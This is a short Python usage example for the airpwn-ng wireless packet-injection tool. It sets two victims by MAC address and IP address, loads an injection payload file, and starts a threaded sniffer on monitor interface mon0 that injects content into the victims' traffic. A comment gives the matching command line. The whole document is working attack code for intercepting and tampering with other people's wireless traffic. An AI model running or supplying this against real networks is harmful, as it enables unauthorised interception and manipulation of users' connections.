import lib.airpwn_ng as AIRPWN_NG

#EXAMPLE API
#SAME AS ./airpwn-ng -m mon0 -i mon0 --injection example-injects/wargames -t 00:01:02:03:04:05 192.168.1.123
victims=[]
vp=AIRPWN_NG.VictimParameters(inject_file="example-injects/wargames")
v1=AIRPWN_NG.Victim(mac="00:01:02:03:04:05",victim_parameters=vp)
v2=AIRPWN_NG.Victim(ip="192.168.1.123",victim_parameters=vp)
victims.append(v1)
victims.append(v2)
ph=AIRPWN_NG.PacketHandler(i="mon0",victims=victims)
snif=AIRPWN_NG.Sniffer(ph,m="mon0")
snif.threaded_sniff()
